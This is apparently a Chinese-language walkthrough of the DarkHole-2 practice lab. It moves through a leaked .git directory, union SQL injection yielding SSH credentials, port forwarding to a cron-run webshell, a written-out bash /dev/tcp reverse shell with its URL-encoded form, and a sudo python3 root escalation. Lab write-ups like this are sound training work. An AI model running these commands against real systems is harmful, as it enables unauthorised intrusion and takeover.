```table-of-contents
```

# 基本渗透流程
![](assets/DarkHole-2/file-20260508151053897.png)

DarkHole系列第二部
访问页面网址进行手工信息收集

![](assets/DarkHole-2/file-20260508151053910.png)
看来需要获得邮箱与密码才行（没法进行注册，也就没法利用部分接口的功能）

![](assets/DarkHole-2/file-20260508151053906.png)
端口扫描
只有：22, 80端口（无其他可用端口）

进行简单的漏洞扫描（也可补充UDP扫描，但大部分情况下UDP很难起作用）
![](assets/DarkHole-2/file-20260508151053930.png)
22:ssh 不做最优选择
80:http 发现貌似存在 **[Git泄露](../../../Hacker/RedteamNotes/靶机精讲/专精武器库/Git泄露/Git泄露.md)**

尝试访问 `.git` 目录
![](assets/DarkHole-2/file-20260508151053904.png)
是的，基本存在**GIt泄露**

![](assets/DarkHole-2/file-20260508151053912.png)
进行Copy，尝试查看GIt的记录

![](assets/DarkHole-2/file-20260508151053936.png)
在GIt记录中就发现了两次提交的记录备注

尝试查看一下提交时记录的详细代码变化内容
![](assets/DarkHole-2/file-20260508151053934.png)
这里就发现了，源码中删除了可能是开发初期使用的邮件与密码内容

![](assets/DarkHole-2/file-20260508151053932.png)
登录成功
接下来就是找到立足点

观察页面构造，发现可能的立足点应该是SQL注入
尝试一下
![](assets/DarkHole-2/file-20260508151053935.png)
貌似是存在SQL注入的

测试 `order by` --> 6
![](assets/DarkHole-2/file-20260508151053938.png)
可以的发现完全可以进行SQL注入（**联合注入**）

![](assets/DarkHole-2/file-20260508151053940.png)

![](assets/DarkHole-2/file-20260508151053945.png)
成功获取到了`ssh`的账户与密码 --> User：jehad ；Pass：fool

![](assets/DarkHole-2/file-20260508151053950.png)
权限列举 ---> 权限很低
尝试提权

![](assets/DarkHole-2/file-20260508151053944.png)
有一个计划任务且查看后貌似是一个**一句话木马**
有点意思，自己写了一个一句话木马（可能因为是靶机故意降低了难度所致）

# 思路：计划任务利用

分析：任务计划可以看出他的运行是本地的（localhost:9999）
但是之前已经获取到了一个用户，所以可以尝试**SSH的本地转发功能**
**“将远程端口放在本地”**
```bash
ssh -L [本地地址:]本地端口:目标主机:目标端口 user@跳板机
ssh -L 0.0.0.0:9999:example.com:80 user@remote.server
```

![](assets/DarkHole-2/file-20260508151053941.png)
可以成功转发

尝试提权逻辑，编写一个反弹Shell
可以借助在线工具：[反弹shell生成-在线](https://shell.iyips.cn/) [在线反弹shell命令生成器](https://cyberpro.com.cn/reverseshell/)
先确定一下shell
![](assets/DarkHole-2/file-20260508151053951.png)
```bash
bash -i >& /dev/tcp/192.156.169.128/9000 0>&1
构造一下：
bash -c 'bash -i >& /dev/tcp/192.156.169.128/9000 0>&1'

# url编码
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.156.169.128%2F9000%200%3E%261%27
```

![](assets/DarkHole-2/file-20260508151053947.png)
成功反弹

![](assets/DarkHole-2/file-20260508151053948.png)

![](assets/DarkHole-2/file-20260508151053954.png)
获得第一个Flag

接下来就是提权**Root**权限
但是基本的**文件**、**计划任务**都已经浏览了一遍，没有发现可能存储的root密码的地方

但是还有一处需要注意⚠️：就是`history`、`bash_history`是否有记录下来详细操作的内容
可以尝试一下
![](assets/DarkHole-2/file-20260508151053953.png)
在里面找到了可能的密码

尝试一下
![](assets/DarkHole-2/file-20260508151053955.png)

成功发现可以再次进行利用的点
还是需要利用**python**进行最终的提权
```bash
sudo python3 -c "import os;os.system('/bin/bash')"
```

![](assets/DarkHole-2/file-20260508151053969.png)

**思路补充**：
其实该题目提供了一个**一句话木马**，且它的权限不算低
所以可以尝试直接通过一句话木马进行输出显示而不是进行反弹Shell

![](assets/DarkHole-2/file-20260508151053971.png)
就是这样直接进行输出即可（这是通过 `ssh` 进行连接的）

到这里也补充一下为什么会选择使用`.bash_history`
因为先前已经证实了使用的是`bash` --> 即可以考虑查看`.bash_history`
当然如果是其他的bash比如：zsh --> `.zsh_history`等一样存在

**默认开启**；**保存于用户家目录的隐藏文件中**

所以可以尝试直接进行操作尝试
![](assets/DarkHole-2/file-20260508151053978.png)
```bash
cat ~/.bash_history
⚠️：图中有%20其实是空格符号的url编码
```
![](assets/DarkHole-2/file-20260508151053976.png)
这里的思路也是成功获得了密码

![](assets/DarkHole-2/file-20260508151053984.png)
成功了！！！

比较推荐使用`ssh`进行操作（因为这样的交互会更加贴近日常使用）

**任务计划的利用到此结束**

⚠️**小结**：
>[!note]
 从该靶机可以看出信息收集都是涉及到渗透测试是否能获取到立足点必不可扫的步骤
 无论是从网页应用对基本漏洞信息的探测，还是提权过程中都会涉及必要的信息收集
 






